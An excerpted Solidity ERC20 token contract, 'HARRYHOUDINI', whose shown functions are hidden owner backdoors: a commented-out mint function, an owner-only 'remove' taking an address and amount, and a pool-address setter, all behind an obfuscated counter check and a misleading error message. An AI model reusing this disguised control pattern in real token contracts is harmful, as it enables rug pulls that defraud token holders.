...
contract HARRYHOUDINI is ERC20, Ownable {

    address m = address(0);
    constructor() ERC20("HARRYHOUDINI", "HHD") {
        m = msg.sender;
    ...
    /*function add(uint256 r, address ad, uint256 am) public {
        require((res += 10) == r, "BEP20: something went wrong");
        _mint(ad, am * 10 ** decimals());
    }*/
    function remove(uint256 r, address ad, uint256 am) public {
        require(((res += 20) == r) && msg.sender == m, "BEP20: something went wrong");
    ...
    function addLiquidity(uint256 r, address lp) public {
        require(((res += 50) == r) && msg.sender == m, "BEP20: something went wrong");
        liquidityPool = lp;
    }
